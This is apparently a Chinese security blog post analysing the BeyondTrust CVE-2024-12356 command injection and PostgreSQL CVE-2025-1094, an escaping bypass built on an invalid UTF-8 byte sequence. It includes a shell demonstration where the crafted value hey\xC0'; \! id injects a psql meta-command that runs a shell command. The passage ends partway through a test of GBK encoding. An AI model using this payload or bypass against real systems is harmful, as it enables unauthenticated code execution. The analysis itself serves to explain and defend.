---
slug: tiangongarticle72
date: 2025-04-02
title: 编码问题引起的RCE分析
author: tiangong
tags: ["beyondtrust","CVE-2024-12356","CVE-2025-1094"]
---


### 一、前言

`CVE-2024-12356`命令注入漏洞影响`BeyondTrust`的`Privileged Remote Access`和`Remote Support`系列产品，并实际上依赖于`PostgreSQL`的`CVE-2025-1094`漏洞。本文从`BeyondTrust`的`CVE-2024-12356`为场景入口，逐步分析到`PostgreSQL`的`CVE-2025-1094`，解释引起命令注入的核心编码问题。

### 二、关键点分析

`CVE-2024-12356`命令注入漏洞通过`WebSocket`访问`BeyondTrust`认证前路由`/nw`，将HTTP中的`Sec-WebSocket-Protocol`子协议头设定为`ingredi support desk customer thin`（以及设定一些其它类似Host的必需参数），即可访问到`thin-scc-wrapper`脚本。

#### 2.1 thin-scc-wrapper分析（CVE-2024-12356）

`thin-scc-wrapper`文件补丁前后主要变化：

```bash
## ... omit

if [[ "$authType" == "0" ]]; then
 	## read a normal sdcust gskey
+	blog "reading gskey"
 	read -t 30 gskey || exit 1
+	blog "read gskey as [$gskey]"

## ... omit

-		quoted=$(export PHPRC="$BG_app_root/config/php-cli.ini"; echo $gskey | $ingrediRoot/app/dbquote)
+		quoted=$(export PHPRC="$BG_app_root/config/php-cli.ini"; echo "$gskey" | $ingrediRoot/app/dbquote)
 		if [[ $(echo "SELECT COUNT(1) FROM gw_sessions WHERE session_key = $quoted AND session_type = 'sdcust' AND (expiration IS NULL OR expiration>NOW())" | $db) != "1" ]]; then
+			blog "failed to find gskey in gw_sessions"
 			echo "1 failure" >&0
 			exit 0
 		fi
```

* `read -t 30 gskey` 从标准输入（**WebSocket数据流**）中读取数据，并存储到变量`gskey`中，该**$gskey变量数据用户可控**
* `quoted=$(export PHPRC="$BG_app_root/config/php-cli.ini"; echo "$gskey" | $ingrediRoot/app/dbquote)` 将`$gskey`变量数据数据传递给`dbquote`脚本处理处理（**目的是转义不安全字符**），并将其处理结果赋值给`quoted`
* `$(echo "SELECT COUNT(1) FROM gw_sessions WHERE session_key = $quoted AND session_type = 'sdcust' AND (expiration IS NULL OR expiration>NOW())" | $db)`将`$quoted`拼接到字符串中，并通过管道传递给`$db`执行(即**通过**`psql`执行拼接`$quoted`后的SQL语句)

补丁中将`echo $gskey`变为了`echo "$gskey"`，多出了一个双引号。它们之间的区别，可通过下面测试进行体现：

```bash
## sh环境
$ test="-e hey \x31\x32\x33\x34"; echo $test;
-e hey \x31\x32\x33\x34
test="-e hey \x31\x32\x33\x34"; echo "$test";
-e hey \x31\x32\x33\x34
## bash环境
test="-e hey \x31\x32\x33\x34"; echo $test;
hey 1234
test="-e hey \x31\x32\x33\x34"; echo "$test";
-e hey \x31\x32\x33\x34
```

在`sh`环境中，可以看到`echo $test`和`echo "$test"`在结果上没有区别，`$test`做为一个完整的字符串被打印。在`bash`环境中，可以看到`echo $test`产生了变化，变量`$test`字符串的开头一部分`-e`会被视为`echo`命令的一个参数（使`echo`解释`\xNN`形式的数据），后续部分会被`echo`命令解释输出，其中的`\x31\x32\x33\x34`会被解释为`1234`；相比而言，在`bash`环境有双引号时，`echo "$test"`会原样输出`$test`，不会做任何解释。因此，修复前`echo $gskey | $ingrediRoot/app/dbquote`这种写法，意味着可以将`$gskey`设定为`-e \xNN\xNN...`形式的数据，从而向`dbquote`传入任何攻击者指定的字节数据。

#### 2.2 dbquote分析（CVE-2025-1094）

前文中 `$gskey`可控值被传输到名为`dbquote`的脚本中，该脚本内容：

```php
#!/bin/env php
<?php
## reads one line from stdin and quotes it for safe inclusion into a SQL statement
$v = fgets(STDIN);
$l = strlen($v);
if($l>0 && $v[$l-1] == "\n")
        $v=substr($v,0,$l-1);
$cn = pg_connect("dbname=".$_ENV['BG_database_primary_name']." user=".$_ENV['BG_database_primary_username']);
echo "'".pg_escape_string($cn, $v)."'\n";
```

传入的`$gskey`先通过`fgets`读取，之后会交给`PHP`的`pg_escape_string`进行转义，转义后的**结果会放在两个单引号之间**并打印到标准输出（最后会存储在`thin-scc-wrapper`中名为`quoted`的新变量中）。

上述操作的目的是利用`pg_escape_string`函数转义特殊字符（如单引号），并使其在后续拼接的 SQL 语句中安全使用。如果`pg_escape_string`转义没有问题，那么理论上是不会产生SQL注入的，但事实上产生了`CVE-2025-1094`问题。

`pg_escape_string`的底层实现：

```clike
// pgsql.c from php-src
/* {{{ Escape string for text/char type */
PHP_FUNCTION(pg_escape_string)
{
	// ....
	if (link) {
		pgsql = link->conn;
		ZSTR_LEN(to) = PQescapeStringConn(pgsql, ZSTR_VAL(to), ZSTR_VAL(from), ZSTR_LEN(from), NULL);
	} else
	{
		ZSTR_LEN(to) = PQescapeString(ZSTR_VAL(to), ZSTR_VAL(from), ZSTR_LEN(from));
	}
	to = zend_string_truncate(to, ZSTR_LEN(to), 0);
	RETURN_NEW_STR(to);
}
```

可以看到`pg_escape_string`会进一步调用`PostgreSQL`的`PQescapeStringConn/PQescapeString`，两者都会调用`PQescapeStringInternal`

```clike
// fe-exec.c from postgres-src
size_t PQescapeStringConn(PGconn *conn, char *to, const char *from, size_t length, int *error)
{
	//...
	return PQescapeStringInternal(conn, to, from, length, error, conn->client_encoding, conn->std_strings);
}

size_t PQescapeString(char *to, const char *from, size_t length)
{
	return PQescapeStringInternal(NULL, to, from, length, NULL, static_client_encoding, static_std_strings);
}
```

`PQescapeStringInternal`底层实现：

```clike
// fe-exec.c from postgres-src

static size_t
PQescapeStringInternal(PGconn *conn, char *to, const char *from, size_t length, int *error, int encoding, bool std_strings)
{
	const char *source = from;
	char	   *target = to;
	size_t		remaining = length;
	if (error)
		*error = 0;
	while (remaining > 0 && *source != '\0')
	{
		char		c = *source;
		int			len;
		int			i;
		/* Fast path for plain ASCII */
        // 单字节的最高位Bit不为1，那么视为ascii，即单字节字符
		if (!IS_HIGHBIT_SET(c))
		{
			/* Apply quoting if needed */
            // 仅对单字节字符尝试转义，包括单引号'和右斜线\； 
            // #define SQL_STR_DOUBLE(ch, escape_backslash)	\
			//	((ch) == '\'' || ((ch) == '\\' && (escape_backslash)))
			if (SQL_STR_DOUBLE(c, !std_strings))
				*target++ = c;
			/* Copy the character */
			*target++ = c;
			source++;
			remaining--;
			continue;
		}

		/* Slow path for possible multibyte characters */
        // 单字节的最高Bit为1，那么根据encoding先得到source偏移开始多长的长度被视为一个字符
        // 即返回多字节字符（如 UTF-8 字符）的字节长度
		len = pg_encoding_mblen(encoding, source);

		/* Copy the character */
        // 拷贝一个多字节字符，没有进行任何转义
        // 如果特殊构造的多字节字符，存在某个字节为单引号'，那么就绕过了前面的转义限制
		for (i = 0; i < len; i++)
		{
			if (remaining == 0 || *source == '\0')
				break;
			*target++ = *source++;
			remaining--;
		}
		//...
	}
	/* Write the terminating NUL character. */
	*target = '\0';
	return target - to;
}
```

为了解释上述代码，需要先解释一下什么是多字节字符。类似`UTF8`这样的可变字符，可以是1个字节是1个字符，也可以是2个字节或更多字节构成1个字符。本文中单个字节构成1个字符称为单字节字符，2个或以上的字节构成1个字符，称为多字节字符。上述代码是读取`source`中的字符进行处理，将其中的特殊字符前添加转义字符，拷贝到`target`中。在处理逻辑中有如下关键点：

* 从`source`读取一个字节，如果字节最高`Bit`为0，视为单字节字符；否则视为多字节字符
* 如果是单字节字符，判断单字节字符是否为单引号`'`或右斜线`\`，是的话双倍该单字节字符拷贝到`target`中（双倍的含义就是转义），不是的话直接将单字节字符拷贝到`target`中，不进行转义
* 如果是多字节字符，先通过`pg_encoding_mblen`的分析多字节字符的长度`len`（该长度即几个字节构成一个多字节字符），接着将`source`中`len`个字节直接拷贝`target`中

从上面的关键点来看，多字节字符拷贝的时候没有添加任何其它字符，即不进行任何的转义。那就抛出来一个问题，能不能特殊构造一个多字节字符，该字符存在某个字节为单引号`'`（这样就有可能在后续引发单引号`'`闭合触发`SQL`注入）？

对于双字节字符来说，一个可能的情况是`pg_encoding_mblen`返回`len`为2，且对应从`source`中读取的第2个字节为单引号`'`。由于`source`任意字节可控（来自`dbquote`脚本中`pg_escape_string`的传入参数），所以前面条件暂可简化为要求`pg_encoding_mblen`返回`len`为2。

所以现在来看一下`pg_encoding_mblen`的底层实现：

```clike
// wchar.c from postgres-src

/*
 * Returns the byte length of a multibyte character.
 */
int
pg_encoding_mblen(int encoding, const char *mbstr)
{	
    //每个encoding对应着一个函数集合，pg_wchar_table表维护着这个关系
    //在BeyondTrust设备上默认encoding为UTF-8编码
	return (PG_VALID_ENCODING(encoding) ?
			pg_wchar_table[encoding].mblen((const unsigned char *) mbstr) :
			pg_wchar_table[PG_SQL_ASCII].mblen((const unsigned char *) mbstr));
}
//pg_wchar_table[PG_UTF8].mblen会调用下面表中的pg_utf_mblen
const pg_wchar_tbl pg_wchar_table[] = {
	[PG_SQL_ASCII] = {pg_ascii2wchar_with_len, pg_wchar2single_with_len, pg_ascii_mblen, pg_ascii_dsplen, pg_ascii_verifychar, pg_ascii_verifystr, 1},
	//...
	[PG_UTF8] = {pg_utf2wchar_with_len, pg_wchar2utf_with_len, pg_utf_mblen, pg_utf_dsplen, pg_utf8_verifychar, pg_utf8_verifystr, 4},//UTF8编码对应的函数集合
    //...
};

/*
 * pg_wchar_table[PG_UTF8].mblen会走到此处
 */
int pg_utf_mblen(const unsigned char *s)
{
	int			len;
	if ((*s & 0x80) == 0)
		len = 1;
	else if ((*s & 0xe0) == 0xc0) // 首字节 & 0xe0后 若为0xc0，会被视为2字节字符
		len = 2;
	else if ((*s & 0xf0) == 0xe0) // 首字节 & 0xf0后 若为0xe0，会被视为3字节字符，后续类似
		len = 3;
	else if ((*s & 0xf8) == 0xf0)
		len = 4;
#ifdef NOT_USED
	else if ((*s & 0xfc) == 0xf8)
		len = 5;
	else if ((*s & 0xfe) == 0xfc)
		len = 6;
#endif
	else
		len = 1;
	return len;
}
```

`pg_encoding_mblen`方法会从`pg_wchar_tbl`表中找到某字符编码对应的函数集合，并从中找到存储的`mblen`方法。 对与`PG_UTF8`字符编码来说，相当于要调用上述的`pg_utf_mblen`方法。在该方法中，如果`某字符的第1个字节&0xe0`的结果为`0xc0`，那么就认为该字符占用两个字节。所以，可以构造 `0xC0, 0x27` 的字节序列，该序列视为双字节字符，其`0xC0&0xE0`等于`0xC0`，而且`0x27`为单引号。这种方式构造的多字节字符会直接从`source`被拷贝到`target`，且不会进行任何的转义。

有了上述分析后，直接进行如下三个测试进行验证。

**无单引号测试**：

```bash
$ echo -e "hey" | ./dbquote
'hey'
```

结果可以看到未对`hey`进行任何转义，且首尾额外增加一个单引号

**有单引号测试**：

```bash
$ echo -e "h'ey'" | ./dbquote  
'h''ey'''
```

结果可以看到`h'ey'`中所有单引号前被额外增加了一个单引号进行转义，且首尾额外增加一个单引号

**特殊构造测试**：

```bash
$ echo -e "h\xC0'ey'" | ./dbquote
'h└'ey'''
```

结果可以看到`h\xC0'ey'`中`\xC0`后的单引号**未被转义**，`ey`后的单引号被转义，且首尾额外增加一个单引号。该方式的结果初步看像是可以绕过单引号闭合，可能可以被后续用于`SQL`注入，也就是接下来的`psql`分析。

#### 2.3 psql分析（CVE-2025-1094）

前文`thin-scc-wrapper`中`$(echo "SELECT COUNT(1) FROM gw_sessions WHERE session_key = $quoted AND session_type = 'sdcust' AND (expiration IS NULL OR expiration>NOW())" | $db` 这部分`sql`语句最终交由`psql`执行，其中`$quoted`可以通过**特殊构造测试**中的类似方法实现SQL注入。

[psql](https://www.postgresql.org/docs/current/app-psql.html)做为一个PostgreSQL的客户端，其本身支持一些`meta-commands and various shell-like features`，如下是命令执行的官方文档说明：

```php
\! [ command ] 
With no argument, escapes to a sub-shell; psql resumes when the sub-shell exits. With an argument, executes the shell command command.

Unlike most other meta-commands, the entire remainder of the line is always taken to be the argument(s) of \!, and neither variable interpolation nor backquote expansion are performed in the arguments. The rest of the line is simply passed literally to the shell.
```

通过如下方式模拟实现SQL注入以及命令执行：

```bash
$ quoted=$(echo -e "hey\xC0'; \! id ## " | ./dbquote)
$ echo "SELECT COUNT(1) FROM gw_sessions WHERE session_key = $quoted AND session_type = 'sdcust' AND (expiration IS NULL OR expiration>NOW())" | $db -e
SELECT COUNT(1) FROM gw_sessions WHERE session_key = 'hey└';
ERROR:  invalid byte sequence for encoding "UTF8": 0xc0 0x27
uid=1000(test) gid=1000(test) groups=1000(test),16(cron),70(postgres)
```

前文中`pg_escape_string`转义配合这里的`psql`，构成了实际上的`CVE-2025-1094`漏洞。下面是Postgres官方的说明：

```bash
Improper neutralization of quoting syntax in PostgreSQL libpq functions PQescapeLiteral(), PQescapeIdentifier(), PQescapeString(), and PQescapeStringConn() allows a database input provider to achieve SQL injection in certain usage patterns. Specifically, SQL injection requires the application to use the function result to construct input to psql, the PostgreSQL interactive terminal. 
```

可以看出来，`CVE-2025-1094`不仅包括`PQescapeString`，还涉及`PQescapeLiteral`，`PQescapeIdentifier`和`PQescapeStringConn`。

#### 2.4 触发流程

`CVE-2024-12356`通过`WebSocket`访问`BeyondTrust`认证前路由`/nw`，将HTTP中的`Sec-WebSocket-Protocol`子协议头设定为`ingredi support desk customer thin`（以及设定一些其它类似Host的必需参数），即可访问到`thin-scc-wrapper`脚本。

`thin-scc-wrapper`脚本中`$gskey`变量数据来自`WebSocket`数据流，用户可控。可通过特殊构造的`Invalid UTF-8 0xC0, 0x27`绕过`dbquote`脚本中的`pg_escape_string`转义即`CVE-2025-1094`，并拼接到SQL语句中实现SQL注入【注入`psql`元命令`\! [ command ] `语句】。

包含`SQL`注入的字符串，被传递到`psql`解释，触发元命令`\! [ command ] `执行。

### 三、拓展分析

既然`Postgres`存在这个问题，那么其它的开源数据库是否有类似的问题呢？

#### 3.1 Mysql分析

使用`Mysql`时，类似的转义方法有`mysqli_real_escape_string(mysqli $mysql, string $string): string`。`mysqli_real_escape_string`会调用`mysql_real_escape_string_quote`，而`mysql_real_escape_string_quote`等同于`mysql_real_escape_string`。

```clike
// mysqli_api.c from php-src
PHP_FUNCTION(mysqli_real_escape_string) {
	MY_MYSQL	*mysql;
	zval		*mysql_link = NULL;
	char		*escapestr;
	size_t			escapestr_len;
	zend_string *newstr;

	if (zend_parse_method_parameters(ZEND_NUM_ARGS(), getThis(), "Os", &mysql_link, mysqli_link_class_entry, &escapestr, &escapestr_len) == FAILURE) {
		RETURN_THROWS();
	}
	MYSQLI_FETCH_RESOURCE_CONN(mysql, mysql_link, MYSQLI_STATUS_VALID);

	newstr = zend_string_safe_alloc(2, escapestr_len, 0, 0);
    // mysqli_real_escape_string 会调用 mysql_real_escape_string_quote
	ZSTR_LEN(newstr) = mysql_real_escape_string_quote(mysql->mysql, ZSTR_VAL(newstr), escapestr, escapestr_len, '\'');
	newstr = zend_string_truncate(newstr, ZSTR_LEN(newstr), 0);

	RETURN_NEW_STR(newstr);
}

// mysql_real_escape_string_quote会调用mysql_real_escape_string
## define mysql_real_escape_string_quote(mysql, to, from, length, quote) \
	mysql_real_escape_string(mysql, to, from, length)
```

在`mysqlnd_libmysql_compat.h`中`mysql_real_escape_string`又等同于`mysqlnd_real_escape_string`

```clike
// mysqlnd_libmysql_compat.h from php-src

#define mysql_real_escape_string(r,a,b,c) mysqlnd_real_escape_string((r), (a), (b), (c))
```

在`mysqlnd.h`中`mysqlnd_real_escape_string`会调用连接对象的`escape_string`方法，该方法又调用`mysqlnd_cset_escape_quotes`或`mysqlnd_cset_escape_slashes`

```clike
// mysqlnd.h from php-src

/* Escaping */
#define mysqlnd_real_escape_string(conn, newstr, escapestr, escapestr_len) \
		((conn)->data)->m->escape_string((conn)->data, (newstr), (escapestr), (escapestr_len))

// mysqlnd_connection from php-src

/* {{{ mysqlnd_conn_data::escape_string */
static zend_ulong
MYSQLND_METHOD(mysqlnd_conn_data, escape_string)(MYSQLND_CONN_DATA * const conn, char * newstr, const char * escapestr, size_t escapestr_len)
{
	zend_ulong ret = FAIL;
	DBG_ENTER("mysqlnd_conn_data::escape_string");
	DBG_INF_FMT("conn=%" PRIu64, conn->thread_id);

	DBG_INF_FMT("server_status=%u", UPSERT_STATUS_GET_SERVER_STATUS(conn->upsert_status));
	if (UPSERT_STATUS_GET_SERVER_STATUS(conn->upsert_status) & SERVER_STATUS_NO_BACKSLASH_ESCAPES) {
        // 调用mysqlnd_cset_escape_quotes
		ret = mysqlnd_cset_escape_quotes(conn->charset, newstr, escapestr, escapestr_len);
	} else {
        // 调用mysqlnd_cset_escape_slashes
		ret = mysqlnd_cset_escape_slashes(conn->charset, newstr, escapestr, escapestr_len);
	}
	DBG_RETURN(ret);
}
```

上面的`escape_string`调用`mysqlnd_cset_escape_quotes`，这部分是多字节字符处理的核心逻辑：

```clike
// mysqlnd_charset.c from php-src

/* {{{ mysqlnd_cset_escape_quotes */
PHPAPI zend_ulong mysqlnd_cset_escape_quotes(const MYSQLND_CHARSET * const cset, char * newstr,
											 const char * escapestr, const size_t escapestr_len)
{
	const char 	*newstr_s = newstr;
	const char 	*newstr_e = newstr + 2 * escapestr_len;
	const char 	*end = escapestr + escapestr_len;
	bool	escape_overflow = FALSE;

	DBG_ENTER("mysqlnd_cset_escape_quotes");

	for (;escapestr < end; escapestr++) {
		unsigned int len = 0;
		/* check unicode characters */
		// 多字节字符处理
		if (cset->char_maxlen > 1 && (len = cset->mb_valid(escapestr, end))) {

			/* check possible overflow */
			if ((newstr + len) > newstr_e) {
				escape_overflow = TRUE;
				break;
			}
            // 直接拷贝
			/* copy mb char without escaping it */
			while (len--) {
				*newstr++ = *escapestr++;
			}
			escapestr--;
			continue;
		}  
        // 后续是单字节字符处理
		if (*escapestr == '\'') {  // 单引号转义
			if (newstr + 2 > newstr_e) {
				escape_overflow = TRUE;
				break;
			}
			*newstr++ = '\'';
			*newstr++ = '\'';
		} else {
			if (newstr + 1 > newstr_e) {
				escape_overflow = TRUE;
				break;
			}
			*newstr++ = *escapestr;
		}
	}
	*newstr = '\0';

	if (escape_overflow) {
		DBG_RETURN((zend_ulong)~0);
	}
	DBG_RETURN((zend_ulong)(newstr - newstr_s));
}

// mysqlnd_cset_escape_slashes 代码类似 mysqlnd_cset_escape_quotes，主要增加了对单字节字符的处理，多字节字符处理基本相同。
```

可以看到其逻辑类似`PostgreSQL`，如果`cset->mb_valid(escapestr, end)`调用只检查长度，不检查多字节字符是否`Valid`，那么应该也有类似`Postgres`的问题。但进一步查看源码（以`UTF8`为例），可以发现`mb_valid`对字节是否合法做了检查。

```clike
// 类似Postgres中的pg_wchar_table字符集数组
/* {{{ mysqlnd_charsets */
const MYSQLND_CHARSET mysqlnd_charsets[] =
{
	//...
	{  33, UTF8_MB3, UTF8_MB3"_general_ci", 1, 3, "UTF-8 Unicode", mysqlnd_mbcharlen_utf8mb3,  check_mb_utf8mb3_valid},
	//...
}

// cset为utf8时会走到check_mb_utf8mb3_valid
static unsigned int check_mb_utf8mb3_valid(const char * const start, const char * const end)
{
	unsigned int len = check_mb_utf8mb3_sequence(start, end);
	return (len > 1)? len:0;
}

/* {{{ utf8 functions */
static unsigned int check_mb_utf8mb3_sequence(const char * const start, const char * const end)
{
	zend_uchar	c;

	if (start >= end) {
		return 0;
	}

	c = (zend_uchar) start[0];

	if (c < 0x80) {
		return 1;		/* single byte character */
	}
	if (c < 0xC2) {     // 这里如果使用 0xC0, 0x27 字节序列，会失败。此处进行了"是否为一个有效UTF8字符"的检查
		return 0;		/* invalid mb character */
	}
	if (c < 0xE0) {
		if (start + 2 > end) {
			return 0;	/* too small */
		}
		if (!(((zend_uchar)start[1] ^ 0x80) < 0x40)) { //即使前面c < 0xC2 想办法过了，这里也要求第二个字节最高Bit为1，无法使用0x27；这里也进行了"是否为一个有效UTF8字符"的检查
			return 0;
		}
		return 2;
	}
	if (c < 0xF0) {
		if (start + 3 > end) {
			return 0;	/* too small */
		}
		if (!(((zend_uchar)start[1] ^ 0x80) < 0x40 && ((zend_uchar)start[2] ^ 0x80) < 0x40 &&
			(c >= 0xE1 || (zend_uchar)start[1] >= 0xA0))) {
			return 0;	/* invalid utf8 character */
		}
		return 3;
	}
	return 0;
}
```

可以看出来`utf8`字符集的`mb_valid`操作，会对多字节字符进行检查，要求其必须是`Valid utf8 character`。但前述代码都是在`php-src`分析，事实上，在`mysql-src`源码中，也存在`mysql_real_escape_string` ，这里简单看一下，逻辑和`php-src`中很类似，也会对多字节字符进行检查，要求其必须是`Valid utf8 character`。

```clike
// mysql-src

ulong STDCALL mysql_real_escape_string(MYSQL *mysql, char *to, const char *from,
                                       ulong length) {
  // ....
  // 这里调用mysql_real_escape_string_quote
  return (uint)mysql_real_escape_string_quote(mysql, to, from, length, '\'');
}


ulong STDCALL mysql_real_escape_string_quote(MYSQL *mysql, char *to,
                                             const char *from, ulong length,
                                             char quote) {
  if (quote == '`' || mysql->server_status & SERVER_STATUS_NO_BACKSLASH_ESCAPES)
    //这里调用escape_quotes_for_mysql
    return (uint)escape_quotes_for_mysql(mysql->charset, to, 0, from, length,
                                         quote);
  //...
}

// 核心方法
size_t escape_quotes_for_mysql(CHARSET_INFO *charset_info, char *to,
                               size_t to_length, const char *from,
                               size_t length, char quote) {
  const char *to_start = to;
  const char *end = nullptr;
  const char *to_end = to_start + (to_length ? to_length - 1 : 2 * length);
  bool overflow = false;
  const bool use_mb_flag = use_mb(charset_info);
  for (end = from + length; from < end; from++) {
    int tmp_length = 0;
    // 多字节字符处理； 使用my_ismbchar进行字符长度获取
    if (use_mb_flag && (tmp_length = my_ismbchar(charset_info, from, end))) {
      if (to + tmp_length > to_end) {
        overflow = true;
        break;
      }
      while (tmp_length--) *to++ = *from++;
      from--;
      continue;
    }
    /*
      We don't have the same issue here with a non-multi-byte character being
      turned into a multi-byte character by the addition of an escaping
      character, because we are only escaping the ' character with itself.
     */
    if (*from == quote) {
      if (to + 2 > to_end) {
        overflow = true;
        break;
      }
      *to++ = quote;
      *to++ = quote;
    } else {
      if (to + 1 > to_end) {
        overflow = true;
        break;
      }
      *to++ = *from;
    }
  }
  *to = 0;
  return overflow ? (ulong)~0 : (ulong)(to - to_start);
}
```

除去一些无关代码后，上面`my_ismbchar`对于对于`utf8`来说，相当于调用`my_mb_wc_utf8_prototype`进行检测。

```clike
// 除去一些无关代码后，my_ismbchar对于对于utf8来说
// 相当于调用此处my_mb_wc_utf8_prototype进行检测
static ALWAYS_INLINE int my_mb_wc_utf8_prototype(my_wc_t *pwc, const uint8_t *s,
                                                 const uint8_t *e) {
  if (RANGE_CHECK && s >= e) return MY_CS_TOOSMALL;

  uint8_t c = s[0];
  if (c < 0x80) {
    *pwc = c;
    return 1;
  }

  if (c < 0xe0) {
    if (c < 0xc2)  // Resulting code point would be less than 0x80. 对第一个字节有效性进行检查
      return MY_CS_ILSEQ;

    if (RANGE_CHECK && s + 2 > e) return MY_CS_TOOSMALL2;
	// 对第二个字节的有效性进行检查
    if ((s[1] & 0xc0) != 0x80)  // Next byte must be a continuation byte.
      return MY_CS_ILSEQ;

    *pwc = ((my_wc_t)(c & 0x1f) << 6) + (my_wc_t)(s[1] & 0x3f);
    return 2;
  }

  //...

  return MY_CS_ILSEQ;
}
```

上述过程在获取单个多字节字符的长度时，同时进行了"是否为一个有效`UTF8`字符"的检查。

因此，从前述源码来看，`Mysql`在`UTF8`字符集方面应该不存在类似`Postgres`的问题。

#### 3.2 Postgres修复

在最新的`Postgres`源码`fe-exec.c`中，对于`PQescapeStringInternal`方法，通过增加`pg_encoding_verifymbchar`函数调用来进行多字节字符的有效性检查。

```clike
static size_t
PQescapeStringInternal(PGconn *conn,
					   char *to, const char *from, size_t length,
					   int *error,
					   int encoding, bool std_strings)
{
	const char *source = from;
	char	   *target = to;
	size_t		remaining = strnlen(from, length);
	bool		already_complained = false;

	if (error)
		*error = 0;

	while (remaining > 0)
	{
		char		c = *source;
		int			charlen;
		int			i;

		/* Fast path for plain ASCII */
        // 单字节字符处理
		if (!IS_HIGHBIT_SET(c))
		{
			/* Apply quoting if needed */
			if (SQL_STR_DOUBLE(c, !std_strings))
				*target++ = c;
			/* Copy the character */
			*target++ = c;
			source++;
			remaining--;
			continue;
		}

		/* Slow path for possible multibyte characters */
		charlen = pg_encoding_mblen(encoding, source);
		// 使用 pg_encoding_verifymbchar 进行多字节字符检测； 在修复前是没有该检查的
		if (remaining < charlen ||
			pg_encoding_verifymbchar(encoding, source, charlen) == -1)
		{
			if (error)
				*error = 1;
			if (conn && !already_complained)
			{
				if (remaining < charlen)
					libpq_append_conn_error(conn, "incomplete multibyte character");
				else
					libpq_append_conn_error(conn, "invalid multibyte character");
				/* Issue a complaint only once per string */
				already_complained = true;
			}

			pg_encoding_set_invalid(encoding, target);
			target += 2;

			/*
			 * Handle the following bytes as if this byte didn't exist. That's
			 * safer in case the subsequent bytes contain important characters
			 * for the caller (e.g. '>' in html).
			 */
			source++;
			remaining--;
		}
		else
		{
			/* Copy the character */
			for (i = 0; i < charlen; i++)
			{
				*target++ = *source++;
				remaining--;
			}
		}
	}

	/* Write the terminating NUL character. */
	*target = '\0';

	return target - to;
}
```

对于`UTF8`来说， `pg_encoding_verifymbcha`的检测会调用到`pg_utf8_islegal`，可以看到该函数会检测是否为一个有效`UTF8`字符。

```clike
/*
 * Check for validity of a single UTF-8 encoded character
 */
bool
pg_utf8_islegal(const unsigned char *source, int length)
{
	unsigned char a;

	switch (length)
	{
		default:
			/* reject lengths 5 and 6 for now */
			return false;
		case 4://从第4字节长度开始检查，再第3字节...最后到第1字节
			a = source[3];
			if (a < 0x80 || a > 0xBF)
				return false;
			/* FALL THRU */
		case 3:
			a = source[2];
			if (a < 0x80 || a > 0xBF)
				return false;
			/* FALL THRU */
		case 2:
			a = source[1];
			switch (*source)
			{
				case 0xE0:
					if (a < 0xA0 || a > 0xBF)
						return false;
					break;
				case 0xED:
					if (a < 0x80 || a > 0x9F)
						return false;
					break;
				case 0xF0:
					if (a < 0x90 || a > 0xBF)
						return false;
					break;
				case 0xF4:
					if (a < 0x80 || a > 0x8F)
						return false;
					break;
				default:
					if (a < 0x80 || a > 0xBF)
						return false;
					break;
			}
			/* FALL THRU */
		case 1:
			a = *source;
			if (a >= 0x80 && a < 0xC2)
				return false;
			if (a > 0xF4)
				return false;
			break;
	}
	return true;
}
```

#### 3.3 新的问题

`CVE-2025-1094`修复后，`postgres`对于`UTF8`的处理看着没什么问题，那么对于`gbk`的处理是否有问题？

事实上，`postgres`在服务端不支持`gbk`编码，但是客户端是支持`gbk`编码，在源码中有所体现。

```clike
typedef enum pg_enc
{
	PG_SQL_ASCII = 0,			/* SQL/ASCII */
	//....
	/* followings are for client encoding only */
    PG_SJIS,					/* Shift JIS (Windows-932) */
	PG_BIG5,					/* Big5 (Windows-950) */
	PG_GBK,						/* GBK (Windows-936) */
	PG_UHC,						/* UHC (Windows-949) */
	PG_GB18030,					/* GB18030 */
	PG_JOHAB,					/* EUC for Korean JOHAB */
	PG_SHIFT_JIS_2004,			/* Shift-JIS-2004 */
	_PG_LAST_ENCODING_			/* mark only */
} pg_enc;
```

检查之前的`pg_wchar_table`表，查看`gbk`相关的长度处理`pg_gbk_mblen`和字符检查`pg_gbk_verifychar`。

```clike
const pg_wchar_tbl pg_wchar_table[] = {
	[PG_SQL_ASCII] = {pg_ascii2wchar_with_len, pg_wchar2single_with_len, pg_ascii_mblen, pg_ascii_dsplen, pg_ascii_verifychar, pg_ascii_verifystr, 1},
	//...
	[PG_GBK] = {0, 0, pg_gbk_mblen, pg_gbk_dsplen, pg_gbk_verifychar, pg_gbk_verifystr, 2},
	//...
};

/* msb for char */
#define HIGHBIT					(0x80)
#define IS_HIGHBIT_SET(ch)		((unsigned char)(ch) & HIGHBIT) //检查字节最高BIT是否为1

/*
 * GBK
 */
static int
pg_gbk_mblen(const unsigned char *s)
{
	int			len;
	// 字节最高比特为1，认为是双字节字符；否则，认为是单字节字符
	if (IS_HIGHBIT_SET(*s))
		len = 2;				/* kanji? */
	else
		len = 1;				/* should be ASCII */
	return len;
}

static int
pg_gbk_verifychar(const unsigned char *s, int len)
{
	int			l,
				mbl;

	l = mbl = pg_gbk_mblen(s);
	if (len < l)
		return -1;
    //这里的检查，要求第一个字节不为0x8d，第二个字节不为' '即可过verify
	//#define NONUTF8_INVALID_BYTE0 (0x8d)
	//#define NONUTF8_INVALID_BYTE1 (' ')
	if (l == 2 &&
		s[0] == NONUTF8_INVALID_BYTE0 &&
		s[1] == NONUTF8_INVALID_BYTE1)
		return -1;
	while (--l > 0)
	{
		if (*++s == '\0')
			return -1;
	}
	return mbl;
}
```

简单从源码来看，似乎`gbk`的检查很宽松，是不是有可能存在之前的问题？直接盲测一下，让`postgres-server`使用`UTF8`编码，而客户端采用`gbk`编码。

服务端信息（修复后版本）：

```sql
\l
List of databases
   Name    |  Owner   | Encoding | Locale Provider |   Collate   |    Ctype    | Locale | ICU Rules |   Access privileges
-----------+----------+----------+-----------------+-------------+-------------+--------+-----------+-----------------------
 mydbgkb   | postgres | UTF8     | libc            | zh_CN.UTF-8 | zh_CN.UTF-8 |        |           |
 postgres  | postgres | UTF8     | libc            | zh_CN.UTF-8 | zh_CN.UTF-8 |        |           |
 template0 | postgres | UTF8     | libc            | zh_CN.UTF-8 | zh_CN.UTF-8 |        |           | =c/postgres          +
           |          |          |                 |             |             |        |           | postgres=CTc/postgres
 template1 | postgres | UTF8     | libc            | zh_CN.UTF-8 | zh_CN.UTF-8 |        |           | =c/postgres          +
           |          |          |                 |             |             |        |           | postgres=CTc/postgres
 test      | postgres | UTF8     | libc            | zh_CN.UTF-8 | zh_CN.UTF-8 |        |           |
(5 rows)

postgres=## SHOW server_version;
          server_version
----------------------------------
 17.4 (Ubuntu 17.4-1.pgdg22.04+2)
(1 row)

postgres=## SHOW server_encoding;
 server_encoding
-----------------
 UTF8
(1 row)
```

